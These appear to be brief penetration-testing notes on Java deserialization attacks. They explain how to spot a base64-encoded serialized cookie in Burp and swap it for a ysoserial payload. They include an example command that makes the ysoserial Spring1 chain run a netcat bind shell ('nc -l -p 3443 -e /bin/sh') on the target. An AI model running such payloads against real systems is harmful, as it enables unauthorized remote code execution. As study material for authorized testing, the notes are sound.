### When a cookie appears to be b64 - decode in burp (to get hex output) and look for nullbytes in the string, this is a good indication that the object is serialized  
 ** Once you run through the steps to generate the payload, we simply replace the serialized cookie with our payload
 
### `ysoserial` usage  
 ** Either identify exactly which library is available OR run through each payload  
 ** Base 64 encode your output, so pipe into base64 `<ysoserial and args> | base64`  
 ** `java -jar ysoserial.jar <payload type> <command>` EG `java -jar ysoserial.jar Spring1 'nc -l -p 3443 -e /bin/sh'`  
